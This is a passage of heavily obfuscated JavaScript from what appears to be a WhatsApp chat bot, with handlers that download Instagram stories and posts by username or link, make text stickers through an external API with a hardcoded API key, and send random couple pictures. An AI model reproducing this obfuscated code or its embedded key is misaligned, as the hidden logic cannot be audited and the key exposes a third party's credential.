_0x2da987(_0x78764f);},'JDWtV':_0x39e921(0x8d0,0x672,0xdd7,0xb33)+_0x39e921(0xf55,0xd8e,0xca1,0xdef)+_0x349db7(0x43f,0x41,0x5e7,0x79b)};function _0x39e921(_0x474be0,_0x2e84b3,_0x456e98,_0xe60535){return _0x4aaba1(_0x474be0-0x206,_0x456e98,_0x456e98-0x5c,_0xe60535-0x12b);}const {dl_link:_0xf55f22,thumb:_0x2b94b5,title:_0x333b75,filesizeF:_0x374c3e,filesize:_0x13b601}=_0xdbc94f;function _0x349db7(_0x54a68d,_0x29860c,_0x1796ef,_0x4368e3){return _0x4aaba1(_0x54a68d-0x52,_0x1796ef,_0x1796ef-0x8,_0x4368e3-0xc7);}axios['get']('https://ti'+_0x349db7(0x3ec,0x809,0x8c7,0x62a)+_0x349db7(0xd83,0xddc,0xc2f,0x1120)+_0x39e921(0xd89,0x1056,0xd63,0x103e)+_0xf55f22)[_0x349db7(0xbb7,0xa02,0x9e3,0x941)](async _0x2464c1=>{function _0x486d0b(_0x33b340,_0x10f285,_0x374fba,_0x37bf50){return _0x39e921(_0x37bf50- -0xf9,_0x10f285-0x17,_0x10f285,_0x37bf50-0x17c);}if(_0x2e3d04[_0x42a7a3(0xcbb,0xd93,0x7de,0xbaa)](_0x2e3d04[_0x486d0b(0x674,0x38b,0x3ec,0x83f)](Number,_0x13b601),0x1*0x4a5c+0x4b9d+-0x2fb*0xb))return _0x2e3d04['tGmxp'](sendMediaURL,from,_0x2b94b5,_0x486d0b(0x106b,0x112a,0xd80,0xdfa)+_0x42a7a3(0x1b3,0xaa9,0x997,0x649)+_0x42a7a3(0x4d2,0x360,0x782,0x6be)+_0x333b75+(_0x42a7a3(0x3ab,0xac3,0x770,0x731)+_0x486d0b(0xa1c,0x1fc,0x3d0,0x6b8))+yut[_0x42a7a3(0x337,-0x18a,-0x1b2,0x1d4)][0x1*0x991+0x26bf*-0x1+0x12*0x19f][_0x486d0b(0x5a2,0xa60,0x984,0x65c)]+('\x0a🐣\x20Upload\x20'+':\x20')+yut['videos'][-0x83*-0x2b+0x667*0x5+-0x3604][_0x42a7a3(0x380,0x7e1,0xf4,0x465)]+(_0x486d0b(0x984,0xfa2,0x114b,0xca8)+'\x20')+_0x374c3e+_0x486d0b(0x1158,0xc9a,0x1047,0xebe)+yut[_0x42a7a3(-0x2ad,0x2e9,0x172,0x1d4)][0x12b6+0x76*0x25+-0x23c4][_0x42a7a3(-0x7e,0x748,-0xc2,0x2a7)]+(_0x486d0b(0x4b5,0x813,0x2d6,0x7a7)+_0x486d0b(0x5d9,0xaa2,0x6ec,0x59e))+yut[_0x42a7a3(0x151,0x404,0x25,0x1d4)][0x5e*-0x3d+-0x2332+0x3998][_0x42a7a3(0x85b,0x9e9,0x158,0x527)]+_0x486d0b(0x82a,0xc85,0x6c2,0x9ae)+yut[_0x486d0b(0x286,0x3b,0x42,0x4b9)][-0x1*0xa21+0x63a*0x5+0x1501*-0x1][_0x42a7a3(0xb26,0x8d6,0x770,0x839)]+(_0x42a7a3(0x105,0x6d4,0x339,0x5dd)+_0x486d0b(0x92e,0xe0f,0xc8f,0xbab)+'of\x20more\x20th'+'an\x20the\x20lim'+_0x486d0b(0x3fa,0x2e7,0x5aa,0x758)+'ented\x20in\x20t'+_0x42a7a3(0x2ab,0x90,0x699,0x390)+_0x42a7a3(0x53f,0x4ae,0xb80,0x827)));let _0x3aa17e=await _0x2e3d04[_0x42a7a3(0xc1f,0x86d,0xb4b,0x9d8)](getBuffer,_0xf55f22);const _0x346c79={};_0x346c79[_0x486d0b(0x9c1,0x7a3,0x8cf,0x8f6)]=_0x2e3d04['JDWtV'],_0x346c79[_0x42a7a3(0xbb8,0x80a,0x8b3,0xaa1)]=0x2;function _0x42a7a3(_0x49e8f1,_0xfa5535,_0x210c7b,_0x508cb8){return _0x39e921(_0x508cb8- -0x3de,_0xfa5535-0x2b,_0x49e8f1,_0x508cb8-0x1ae);}_0x346c79[_0x486d0b(0x90f,0xf13,0xd8b,0xb99)]=_0x486d0b(0xf92,0x9bf,0xa65,0xc7f)+'3',_0x346c79[_0x42a7a3(0x416,0x922,0x53f,0x475)]='',_0x346c79[_0x42a7a3(0x6cd,0x32,0xe,0x438)+'rl']='',_0x346c79[_0x42a7a3(0x41f,0x2c5,0x405,0x554)]=pp_userz;const _0x4fd388={};_0x4fd388['forwarding'+'Score']=0x3b9aca00,_0x4fd388[_0x42a7a3(0x1f0,0xa1c,0x43f,0x680)+'d']=!![],_0x4fd388[_0x486d0b(0x1b9,0x40a,0x105,0x57e)+'ral']=!![],_0x4fd388[_0x486d0b(0x9c6,0xb7f,0x800,0x98e)+'Reply']=_0x346c79;const _0xe8c5cc={};_0xe8c5cc[_0x486d0b(0xe88,0x5ae,0x888,0x994)+'o']=_0x4fd388,_0xe8c5cc[_0x42a7a3(0x930,0x96e,0x820,0x64d)]=_0x42a7a3(0x744,0x681,0xeda,0x9f3),_0xe8c5cc[_0x486d0b(0x780,0x7ef,0xb1f,0xbea)]=_0x333b75+_0x42a7a3(0x32d,0x55f,0x142,0x5f5),_0xe8c5cc[_0x486d0b(0xa3f,0x1145,0xda6,0xdf0)]=fgclink2,_0xe8c5cc[_0x486d0b(0xd45,0x84a,0x61d,0x839)]=pp_userz,alpha[_0x486d0b(0x78f,0xc72,0x6ca,0x9c1)+'e'](from,_0x3aa17e,MessageType[_0x486d0b(0x767,0xd5e,0xa7b,0xa4e)],_0xe8c5cc);});})[_0x406083(0xa96,0x5ae,0xb23,0xab6)](_0x186840=>reply(''+_0x186840));}catch(_0x17cb24){console['log'](color(_0x4aaba1(0x572,0x94f,0x8e7,0x94e),_0x4aaba1(0xad9,0xa5b,0xbaa,0xb54)),_0x17cb24);}break;case _0x4aaba1(0x71b,0x8e3,0x293,0x928):case _0x4aaba1(0x3b9,0x77e,0x4dd,-0xd3):case _0x406083(0x8f8,0xbce,0xce8,0x49c)+_0x4aaba1(0x6f2,0x94f,0x90f,0x664):if(!q)return reply('Usernameny'+'a?');pape=q,hx['igstory'](pape)[_0x4aaba1(0xb65,0xc55,0xb7d,0xd99)](async _0x450b82=>{const _0x844e13={'vIiSb':function(_0x4fde37,_0x27cfd7){return _0x4fde37(_0x27cfd7);},'bPlES':'Emror','oGfpa':function(_0x491662,_0x272b57){return _0x491662>=_0x272b57;},'NYFHQ':function(_0x45315a,_0x1b60df,_0x382663,_0x2c1c2b){return _0x45315a(_0x1b60df,_0x382663,_0x2c1c2b);},'aPTTC':function(_0x453e89,_0x148d61,_0x5e2f77,_0x6be3a8){return _0x453e89(_0x148d61,_0x5e2f77,_0x6be3a8);},'IxtRd':_0x1bee2b(0x8a4,0xb6e,0xec5,0x787),'dUIOB':function(_0x574a1e,_0x2a31fa,_0x2f5f96){return _0x574a1e(_0x2a31fa,_0x2f5f96);},'sUXlM':_0x1bee2b(0x3f0,0x836,0xcea,0xa4c)+'ta','WCVtt':_0x1bee2b(0xa38,0xd14,0x11b8,0x9bb),'qTtZR':function(_0x1c2c15,_0x1e6740){return _0x1c2c15(_0x1e6740);},'fvoyu':_0x347313(0xa61,0x835,0x480,0x9f9)+'eed','yQvUG':function(_0x593a87){return _0x593a87();},'HemYH':function(_0x2ebcda,_0x19c923){return _0x2ebcda-_0x19c923;},'chdOV':function(_0x34184d){return _0x34184d();},'DLNSZ':function(_0x19c3fc,_0x5575e6,_0x55d5a2){return _0x19c3fc(_0x5575e6,_0x55d5a2);},'bMUtP':function(_0x3d8a70,_0x88aab5){return _0x3d8a70!==_0x88aab5;},'sGGXV':_0x1bee2b(0x818,0xb3d,0xfc2,0xf25),'tAsqx':_0x347313(0xbe3,0xa09,0x76d,0x67d),'bpQGr':function(_0xab8496,_0x9c163f){return _0xab8496===_0x9c163f;},'FyslV':_0x347313(0x92c,0x7cf,0xae1,0x303),'yfgck':'ZYjPz','VZoaz':function(_0x2bd081,_0x800a77){return _0x2bd081(_0x800a77);}};let _0x1b3b97=await _0x844e13[_0x1bee2b(0xaa3,0x771,0x72f,0x4af)](getBuffer,_0x450b82[_0x1bee2b(0x62,0x49e,0x497,0x73b)]['profilePic'+_0x347313(0x9e0,0xb98,0xdb6,0xdde)]);await alpha[_0x1bee2b(0x715,0x91a,0xa23,0x48d)+'e'](from,_0x1b3b97,image,{'thumbnail':_0x1b3b97,'quoted':mek,'caption':_0x347313(0x5f3,0x526,0x272,0x840)+_0x347313(0x55c,0x19a,0x477,-0x63)+'」'+enter+enter+_0x1bee2b(0xb9e,0xd2a,0x1118,0xf7e)+_0x450b82[_0x347313(0x18d,0x201,-0xf0,0xcc)]['id']+enter+(_0x347313(0x40f,0x3cc,0x247,-0xa7)+'e\x20:*\x20')+_0x450b82[_0x1bee2b(0x3e1,0x49e,0x4e,0x8f5)][_0x347313(0x8bf,0x92f,0x918,0x453)]+enter+(_0x1bee2b(0xa90,0x75d,0x6fd,0x77c)+_0x347313(0x5d1,0x9c6,0x727,0x89c))+_0x450b82[_0x1bee2b(0x3d3,0x49e,0x305,0x4b7)][_0x347313(0x532,0x424,0x31c,0x1e9)]+enter+(_0x1bee2b(0x1095,0xbbe,0xcd7,0xe41)+_0x1bee2b(0x804,0x748,0x3af,0xa46))+_0x450b82[_0x1bee2b(0x42b,0x49e,0x3cf,0x6e1)]['followers']+enter+('✨\x20*Followi'+_0x347313(0x5c7,0x394,0x6f1,0x897))+_0x450b82[_0x1bee2b(-0x7f,0x49e,0x616,0x2b)][_0x347313(0xa8a,0x78f,0x651,0x5f0)]+enter+('*🔗\x20Link\x20:*'+_0x1bee2b(0xc1d,0xe16,0xb2a,0xe0c)+_0x1bee2b(0x998,0xcad,0xc06,0x855)+_0x347313(0xb21,0x8c7,0x82a,0x635))+_0x450b82[_0x1bee2b(0x4de,0x49e,0x43f,0x959)][_0x347313(0x812,0x92f,0x604,0xa50)]+enter+(_0x1bee2b(0xc6e,0x888,0x6ff,0x8d5)+'*\x20')+_0x450b82[_0x347313(0x2ac,0x55e,0x61,0x65f)][_0x1bee2b(0x7f3,0x832,0x3c0,0x4a6)]+_0x347313(0x744,0x2a5,-0x109,0x448)+enter+enter+(_0x1bee2b(0xfc4,0xad1,0x7b1,0xc83)+_0x347313(0x733,0xb4d,0xac0,0x884)+_0x1bee2b(0x82a,0x92c,0x49d,0xd32)+_0x1bee2b(0xb99,0xc2c,0xd62,0x8f8)+'_')});function _0x1bee2b(_0x44e5f5,_0x20932c,_0x5d3014,_0x44afef){return _0x406083(_0x20932c-0x9b,_0x20932c-0x39,_0x5d3014-0x195,_0x44afef);}function _0x347313(_0x31dc7b,_0x3943a6,_0x1df661,_0x19133c){return _0x4aaba1(_0x3943a6- -0x237,_0x1df661,_0x1df661-0x90,_0x19133c-0x17e);}for(let _0x2c4bbe of _0x450b82[_0x1bee2b(0x80c,0x7fb,0x2d8,0x78e)]){if(_0x844e13['bMUtP'](_0x844e13[_0x1bee2b(0xb27,0x617,0xb1d,0x497)],'PmVgR')){if(_0x844e13['oGfpa'](_0x844e13['vIiSb'](_0x822626,_0x5095bd),0x4*0x284f+0xad65*0x1+-0xd971))return _0x844e13['NYFHQ'](_0x4e576a,_0x220a7d,_0x2ecfb5,'*🎧\x20P\x20L\x20A\x20Y'+_0x1bee2b(0x7b4,0x887,0xa08,0x98f)+'💦\x20Title\x20:\x20'+_0x429e98+(_0x1bee2b(0x63d,0x96f,0xbbd,0x9e5)+_0x1bee2b(0x264,0x611,0x766,0x5b1))+_0x3aa9ca[_0x347313(0x183,0x175,-0x1b5,0xf4)][0xcf5*-0x1+0x3c5*0x6+-0x1*0x9a9][_0x1bee2b(0x7c6,0x5b5,0x4c2,0x4d8)]+('\x0a🐣\x20Upload\x20'+':\x20')+_0x37b42f['videos'][0x1*-0x2029+-0xca*-0x13+-0xf*-0x125][_0x347313(0x499,0x406,0x144,0x91d)]+(_0x347313(0x57a,0x964,0xa4f,0x5b4)+'\x20')+_0x5c06a2+_0x1bee2b(0xb9b,0xe17,0x128e,0x9a2)+_0x4e8eb0['videos'][0x1bda+0x5*-0x4e5+-0x1*0x361][_0x1bee2b(0x71d,0x4e5,0x590,0x5a7)]+(_0x1bee2b(0x5c3,0x700,0x621,0xc22)+'on\x20:\x20')+_0x4aba4f[_0x347313(-0x2bc,0x175,-0x14a,0x224)][0x701*0x1+0x1f6a*0x1+-0x266b]['timestamp']+'\x0a🌀\x20Url\x20:\x20'+_0x239cae[_0x1bee2b(0x78a,0x412,0x4db,-0xac)][-0x4*-0x62e+-0xa31+-0x1*0xe87][_0x1bee2b(0x80a,0xa77,0xc5e,0x6e3)]+(_0x347313(0x819,0x57e,0x4c4,0xa8d)+_0x1bee2b(0xeca,0xb04,0xaab,0xa9c)+'of\x20more\x20th'+_0x1bee2b(0x4e8,0x90e,0xad0,0x99f)+_0x1bee2b(0x44a,0x6b1,0x1bd,0x2c3)+_0x1bee2b(0xa09,0xb0f,0xac0,0xf42)+_0x1bee2b(0x852,0x5ce,0x1ff,0x2bc)+_0x347313(0x56c,0x7c8,0xaf4,0x319)));_0x844e13['aPTTC'](_0x2d5285,_0x2f5ed,_0x5c1fbb,'')[_0x1bee2b(0xa12,0xb31,0x973,0x9ee)](_0x2b035d=>{function _0x28a3d9(_0x3cc45f,_0x4bccc,_0x16905a,_0x36fc2b){return _0x1bee2b(_0x3cc45f-0x163,_0x16905a- -0x1b9,_0x16905a-0x11,_0x36fc2b);}_0x844e13['vIiSb'](_0x30c486,_0x844e13[_0x28a3d9(0x437,0x944,0x765,0x6ee)]);});}else{if(_0x2c4bbe[_0x1bee2b(0xdbe,0xa77,0xf7a,0x7ce)][_0x347313(0x645,0x3be,0x112,0x54a)](_0x844e13['tAsqx'])){let _0x394be0=await _0x844e13[_0x347313(0x7fb,0x4d4,0x31a,0x69c)](getBuffer,_0x2c4bbe[_0x1bee2b(0xd9f,0xa77,0xcb0,0xa98)]);alpha[_0x347313(0xb42,0x67d,0x342,0xb2d)+'e'](from,_0x394be0,video,{'thumbnail':Buffer[_0x1bee2b(0x560,0x7d2,0x9a0,0x5d5)](-0x2*-0x565+-0xf*0x1bf+0xf67),'quoted':mek,'caption':_0x347313(0x290,0x1a0,0x158,-0x345)+'•\x20'+_0x2c4bbe[_0x1bee2b(0x35b,0x87c,0x82a,0x6dd)]});}else{if(_0x844e13[_0x1bee2b(0xac5,0x847,0x597,0x551)](_0x844e13[_0x1bee2b(0xf47,0xc8a,0xb39,0xb92)],_0x844e13['yfgck'])){const _0xdf16ef={'XHXKp':_0x844e13[_0x347313(0x3f0,0x31e,0x303,-0x1d6)],'HtSIr':function(_0x26c6d5,_0x2d972e){function _0x2b2492(_0x33865c,_0x4dbac8,_0x4731ec,_0xb6e1b4){return _0x1bee2b(_0x33865c-0xb3,_0x4dbac8- -0x25c,_0x4731ec-0x10f,_0x4731ec);}return _0x844e13[_0x2b2492(0xbfa,0x6fd,0x3da,0x39c)](_0x26c6d5,_0x2d972e);}};if(_0x7349cd[_0x347313(0x856,0x591,0x507,0x467)]==''+_0x4d7ba6){_0x1f3b9b[_0x347313(0x39a,0x260,0x325,0x729)](_0x844e13[_0x1bee2b(0xe1d,0xd70,0x11c9,0xe7c)](_0x1a1a27,_0x50b63d,'magenta'),_0x844e13['dUIOB'](_0x2c7ffb,_0x1ac537['tz'](_0x844e13[_0x1bee2b(0xd77,0xbfb,0x10ba,0xfb6)])[_0x1bee2b(0x85e,0x716,0xa3d,0x99a)](_0x1bee2b(0x8e4,0xa36,0x561,0xb4e)),_0x844e13[_0x347313(0xeff,0xa28,0x648,0x5ef)]),_0x844e13[_0x1bee2b(0x783,0x771,0x6f1,0x9a5)](_0x2067cf,_0x844e13[_0x347313(0x19,0x472,0x61,0x56e)]));const _0x2de068=_0x844e13['yQvUG'](_0x76ff59),_0x5b73b4=_0x844e13[_0x1bee2b(0xab8,0x745,0x7e2,0xb79)](_0x844e13['chdOV'](_0x3c3a64),_0x2de068);_0x844e13[_0x347313(0x20b,0x1f3,-0x2a8,0x3c1)](_0x3f3459,_0x347313(0x4f2,0x7be,0x9c9,0x85c)+_0x347313(0x7fe,0x972,0x801,0x5ed),(_0x316737,_0x221c1c,_0x5b1151)=>{const _0x2eea5c=_0x221c1c[_0x1b8096(0x4ce,0x672,0x9ed,0x18a)](_0xad6d8c(0x522,0x49b,0x572,0x1ee));function _0xad6d8c(_0x2033cf,_0x2644ce,_0x282897,_0xf990dd){return _0x1bee2b(_0x2033cf-0x1c7,_0x2033cf- -0x56a,_0x282897-0x8e,_0x282897);}const _0x26614e=_0x2eea5c[_0x1b8096(0x651,0x168,0x693,0x723)](/Memory:/,_0xdf16ef[_0xad6d8c(0x1b,0x4c7,0x3f1,-0x2f4)]),_0x30310c='*'+_0x26614e+_0xad6d8c(0x575,0x5ef,0x1d0,0x700)+_0x5b73b4[_0xad6d8c(0x4fd,0x624,0x480,0x9b6)](-0xdfa+-0x1990+0x278e)+_0xad6d8c(0x3c3,0x7d5,0x5a6,0x6be);function _0x1b8096(_0x334078,_0x2ba8aa,_0x4b88a4,_0x1d506d){return _0x347313(_0x334078-0x5a,_0x334078- -0x1cd,_0x4b88a4,_0x1d506d-0x1b8);}_0xdf16ef[_0xad6d8c(-0x76,0x1bc,0x3d7,-0xe4)](_0x2d90f5,_0x30310c);});}}else{let _0x21d26e=await _0x844e13[_0x1bee2b(0x281,0x46d,0x962,0x60c)](getBuffer,_0x2c4bbe[_0x1bee2b(0xbde,0xa77,0x7f6,0x6c8)]);alpha[_0x347313(0x52a,0x67d,0x6a4,0x4a7)+'e'](from,_0x21d26e,image,{'thumbnail':Buffer['alloc'](-0x1cc4+0x2259*-0x1+0x3f1d),'quoted':mek,'caption':_0x1bee2b(0xa,0x43d,0x59a,0x331)+'•\x20'+_0x2c4bbe[_0x1bee2b(0xa45,0x87c,0xcc4,0x85d)]});}}}}})[_0x406083(0xa96,0xe23,0xa03,0xb6f)](_0x37b037=>reply(_0x4aaba1(0x649,0x89b,0x65e,0x6f5)+'salahan\x20at'+_0x4aaba1(0x46c,0x842,0x351,0xde)+_0x4aaba1(0xc4e,0x94c,0xef8,0x105b)+'ate'));break;case'ig':case'igdl':case'igphoto':case _0x4aaba1(0x525,0x302,0x402,0x1):case _0x406083(0x4d3,-0x4b,0x421,0x415):case _0x4aaba1(0xc6e,0x9a3,0xb2f,0x116c):case _0x4aaba1(0x47e,-0x1a,0x18b,0x286):case _0x406083(0x6ac,0x336,0x946,0x4ac):case _0x4aaba1(0x6b8,0x65a,0x9a4,0xa99):case'igreels':case _0x4aaba1(0x9ec,0x56e,0xafa,0xad8):case _0x406083(0x6f1,0x909,0x524,0x98e):case'igtv':case _0x4aaba1(0x41c,0x446,-0x7e,0x2cf):if(!isUrl(args[-0x25ea+-0x19df+-0x1*-0x3fc9])&&!args[0x1*-0x2555+-0x1*0x1623+0x3b78]['includes'](_0x4aaba1(0x3a8,0x79a,0x44d,0x56f)+_0x406083(0x496,0x69f,0x3e,0x61f)))return reply(lang[_0x4aaba1(0x8af,0x93b,0xd7a,0xc68)]());let urlnya=q;hx[_0x4aaba1(0x7e6,0x303,0x2ca,0xc82)](urlnya)[_0x406083(0xb30,0x64f,0xbf0,0xe51)](async _0x600b79=>{function _0x140729(_0x30aab4,_0x4505b2,_0x349828,_0x1ef10f){return _0x406083(_0x1ef10f- -0x4da,_0x4505b2-0x65,_0x349828-0x15a,_0x4505b2);}const _0x4d7f68={'JDJAy':function(_0x5c1d93,_0x5f344a){return _0x5c1d93(_0x5f344a);},'lAdIK':_0x34db2a(0x7eb,0x3ad,0x514,0x713),'eNWeT':function(_0x166d52,_0x2164d6){return _0x166d52(_0x2164d6);}};let _0x110759=await _0x4d7f68['JDJAy'](getBuffer,_0x600b79[_0x140729(-0x58d,-0x191,-0x21e,-0xd7)][_0x34db2a(-0x75,0x4cd,0x811,0x344)+_0x140729(0x985,0x3f6,0xca3,0x8c0)]);function _0x34db2a(_0x238972,_0x24756e,_0x496926,_0x432f4c){return _0x406083(_0x432f4c- -0x4f8,_0x24756e-0x1be,_0x496926-0x5b,_0x496926);}await alpha[_0x140729(0x96,0x5bb,0x53d,0x3a5)+'e'](from,_0x110759,image,{'thumbnail':_0x110759,'quoted':mek,'caption':_0x140729(-0x128,-0x18f,0x3b5,0x24e)+_0x34db2a(0x407,0x489,-0x24d,0x1c9)+_0x34db2a(0x3bc,0x153,0x40b,0x77)+enter+enter+_0x34db2a(0x354,0x72d,0x8f0,0x797)+_0x600b79[_0x140729(-0x27d,0x442,0x24c,-0xd7)]['id']+enter+(_0x140729(0x3fa,0x6c,-0x1f5,0xf4)+'e\x20:*\x20')+_0x600b79[_0x34db2a(-0x245,0x2e6,0x99,-0xf5)]['username']+enter+('💋\x20*Fullnam'+_0x140729(0xaa1,0x91f,0x9d2,0x6ee))+_0x600b79[_0x140729(-0x2cf,-0x54b,0x235,-0xd7)][_0x34db2a(-0x345,0x371,-0x8,0x12e)]+enter+(_0x34db2a(0x434,0x549,0x93e,0x62b)+_0x140729(-0xf7,0x230,0x99,0x1d3))+_0x600b79[_0x34db2a(0x22c,-0x56c,-0x205,-0xf5)]['followers']+enter+(_0x140729(0x6d1,0x470,0x670,0x3ba)+_0x140729(0x494,0x41f,-0x450,0xbc))+_0x600b79[_0x140729(-0x5c6,-0x571,0x21b,-0xd7)][_0x34db2a(0x3a4,0x384,0x20f,0x499)]+enter+(_0x140729(0x2b8,0x99,0x21c,0x4af)+'\x20https://i'+'nstagram.c'+_0x140729(0x487,0x94d,0x976,0x5ef))+_0x600b79[_0x140729(0x3e0,-0x14c,0x17e,-0xd7)][_0x140729(0x137,0x391,0x829,0x657)]+enter+(_0x34db2a(0x6b9,0x6c2,0x814,0x2f5)+'*\x20')+_0x600b79['medias'][_0x34db2a(0x219,-0xb1,0x51b,0x29f)]+_0x34db2a(0x43e,-0x36b,0x12d,-0x51)+enter+enter+(_0x34db2a(0x665,0x354,0x22a,0x53e)+_0x140729(0x670,0xaa2,0x671,0x875)+'t\x20media\x20ak'+_0x34db2a(0xba3,0x457,0x606,0x699)+'_')});for(let _0x11950f of _0x600b79[_0x34db2a(0x146,0x5d6,0x45c,0x268)]){if(_0x11950f['url']['includes'](_0x4d7f68['lAdIK'])){let _0x43a9fe=await _0x4d7f68[_0x140729(0x9b5,0x87a,0x210,0x6f3)](getBuffer,_0x11950f[_0x34db2a(0x56a,0x7b8,0x83e,0x4e4)]);alpha[_0x140729(0x7,0x50c,0x6e1,0x3a5)+'e'](from,_0x43a9fe,video,{'thumbnail':Buffer[_0x140729(-0xaf,-0x90,-0x98,0x25d)](0x1df6+0x1155*0x2+-0x5e*0xb0),'quoted':mek,'caption':_0x140729(0x63,0x1df,-0x122,-0x138)+_0x34db2a(-0xaf,-0xba,0x51d,0x302)+_0x11950f['type']});}else{let _0x41540f=await _0x4d7f68[_0x140729(0x7b3,0x6bb,0x325,0x6f3)](getBuffer,_0x11950f[_0x140729(0x13f,0x73b,0x180,0x502)]);alpha['sendMessag'+'e'](from,_0x41540f,image,{'thumbnail':Buffer['alloc'](-0x1f9d+0x57e+0x8b5*0x3),'quoted':mek,'caption':'Instagram\x20'+'•\x20'+_0x11950f['type']});}}})[_0x406083(0xa96,0xc2f,0x764,0xda4)](_0x99efb7=>reply(_0x406083(0xb75,0xc08,0xd62,0x72b)+_0x406083(0xc3f,0xb07,0xd53,0xea0)+_0x406083(0xb95,0x6d7,0x9df,0x769)+_0x406083(0x4ee,0xc8,0x93b,0x8f9)+'te'));break;case _0x406083(0x741,0x4ad,0x744,0xc4b):if(args[_0x406083(0x797,0x472,0x8af,0x301)]<-0x1*0x208a+-0x8c8+0x2953*0x1)return reply(lang['noteks'](prefix,command));hhh=q,p=await getBuffer(_0x4aaba1(0x95d,0xb40,0xa43,0xcaf)+_0x406083(0x946,0x85f,0x6d9,0x5de)+'an.herokua'+'pp.com/api'+_0x4aaba1(0x6c6,0x712,0x90c,0xa79)+_0x406083(0xd43,0x904,0xc6b,0x81f)+hhh+(_0x406083(0x997,0xcf5,0x5e0,0x4f2)+'e&apikey=h'+_0x406083(0x96b,0x60d,0xafa,0xe50)));const _0x1ae38f={};_0x1ae38f[_0x4aaba1(0xce3,0xd21,0xc9d,0xcf6)]=fgclink,alpha[_0x4aaba1(0x8b4,0xccb,0x72d,0x65c)+'e'](from,p,sticker,_0x1ae38f);break;case _0x406083(0xa16,0x6b5,0x723,0x8c1):if(args[_0x406083(0x797,0xac1,0x61d,0x8ae)]<-0x1*-0x178d+0x3*0xd+-0x17b3*0x1)return reply(lang['noteks'](prefix,command));hhh=q,pp=await getBuffer(_0x4aaba1(0x95d,0xcce,0x9da,0xa55)+_0x406083(0x946,0xb31,0x9dd,0x46b)+_0x406083(0x55d,0x4ce,0x27c,0x91e)+_0x4aaba1(0xc2c,0x102a,0x844,0xca6)+'/ttpcustom'+_0x406083(0xd43,0xd47,0x832,0x1059)+hhh+(_0x4aaba1(0xaff,0xaa2,0xc2e,0xd64)+_0x406083(0xa87,0xcce,0x833,0xc96)+'=hardianto'));const _0x5c87c5={};_0x5c87c5[_0x406083(0xcae,0x7a3,0xeda,0xc5e)]=fgclink,alpha[_0x4aaba1(0x8b4,0x814,0x891,0x8cf)+'e'](from,pp,sticker,_0x5c87c5);break;case _0x406083(0x73c,0x77e,0x510,0x64b):if(args[_0x4aaba1(0x7cc,0xc5b,0x9c1,0x6d6)]<-0x3a3+-0x1275+0x1619)return reply(lang['noteks'](prefix,command));hhh=q,ppp=await getBuffer(_0x406083(0x928,0x440,0x95c,0xc86)+_0x4aaba1(0x97b,0x719,0xcbf,0x716)+_0x406083(0x55d,0x819,0x760,0x6c5)+_0x406083(0xbf7,0xa8e,0xf89,0xc29)+_0x4aaba1(0x6c6,0x92f,0x975,0x42c)+_0x4aaba1(0xd78,0x1119,0xcdd,0xf2b)+hhh+(_0x4aaba1(0xb33,0xfa9,0xe35,0x857)+_0x406083(0x4fd,0x537,0x445,0x311)+'rdianto'));const _0x4155a9={};_0x4155a9[_0x406083(0xcae,0x1174,0xd7e,0xebb)]=fgclink,alpha[_0x406083(0x87f,0x70e,0xd6d,0x8e5)+'e'](from,ppp,sticker,_0x4155a9);break;case _0x4aaba1(0x89d,0xc4c,0x9b2,0x938):if(args[_0x406083(0x797,0x78e,0x7f5,0x5da)]<0x1*0x1d98+0x1cc8+-0x3a5f)return reply(lang[_0x406083(0xa6f,0xdcd,0x935,0x794)](prefix,command));hhh=q,pppp=await getBuffer(_0x4aaba1(0x95d,0x995,0x79f,0x77d)+_0x4aaba1(0x97b,0x4b5,0xb07,0x756)+'an.herokua'+'pp.com/api'+'/ttpcustom'+_0x4aaba1(0xd78,0xbe4,0xc87,0xbd8)+hhh+('&color=cya'+_0x4aaba1(0x42e,0xf8,-0x27,0x2cd)+'ardianto'));const _0x129d50={};_0x129d50[_0x4aaba1(0xce3,0xbff,0x81d,0xdf8)]=fgclink,alpha[_0x406083(0x87f,0xc44,0xb1e,0xb6a)+'e'](from,pppp,sticker,_0x129d50);break;case _0x4aaba1(0x3cc,0x491,-0xc2,0x788):case _0x4aaba1(0xcb3,0x821,0xe55,0xb2c):if(!isGroup)return reply(lang['onlygc']());var datax=fs[_0x4aaba1(0x59d,0x7c9,0x3c4,0x33e)+'nc']('./lib/coup'+_0x406083(0x91a,0xd7a,0xd74,0x82e));jsonData=JSON[_0x406083(0x642,0x3e0,0x304,0x2f9)](datax),randIndex=Math['floor'](Math['random']()*jsonData['length']);let randKey_=jsonData[randIndex];Laki=await getBuffer(randKey_[_0x4aaba1(0x598,0x364,0x413,0x14d)]),await alpha[_0x4aaba1(0x8b4,0xc14,0x63d,0xcb8)+'e'](from,Laki,image,{'caption':_0x4aaba1(0xd5a,0x846,0xb61,0xd58),'quoted':mek,'thumbnail':Buffer['alloc'](0x5b*0x9+0x1*-0x1345+0x1012)}),Cewe=await getBuffer(randKey_['female']);const mediaxox=await alpha['prepareMes'+_0x4aaba1(0x4ff,0x924,0x878,0x934)](from,Cewe,MessageType[_0x406083(0x413,0x5aa,0x77f,0x6d1)],{'thumbnail':Buffer[_0x4aaba1(0x76c,0x458,0x3c8,0xb63)](0x1c5b*-0x1+-0x41e+0x33*0xa3)});let bacotluxxo=mediaxox[_0x4aaba1(0x49c,0x51,0x6e2,0x5ad)]['ephemeralM'+_0x406083(0xa63,0x9c4,0xcc7,0x943)]?mediaxox[_0x406083(0x467,0x5b8,0x1b5,-0xaf)][_0x406083(0x8f0,0xd50,0xda9,0x94b)+_0x406083(0xa63,0x8d6,0x747,0x8e2)]:mediaxox;const _0x6d980b={};_0x6d980b['displayTex'+'t']=_0x4aaba1(0x48f,0x2a5,0x5a8,0x42d);const _0x2bfb39={};_0x2bfb39[_0x406083(0x758,0xc7c,0x95e,0x54a)]=_0x4aaba1(0xd52,0x106a,0x8f4,0x122b),_0x2bfb39[_0x4aaba1(0x6e9,0x3d5,0x522,0x882)]=_0x6d980b,_0x2bfb39[_0x4aaba1(0x816,0xd21,0x33c,0x49f)]=0x1;const _0x1499d3={};_0x1499d3[_0x4aaba1(0x543,0x684,0x8be,0x426)+'t']='Next\x20➡️';const _0x39da3c={};_0x39da3c[_0x4aaba1(0x78d,0x822,0x2d3,0xb6b)]=''+command,_0x39da3c['buttonText']=_0x1499d3,_0x39da3c[_0x406083(0x7e1,0x4d8,0x4e0,0x406)]=0x1;const 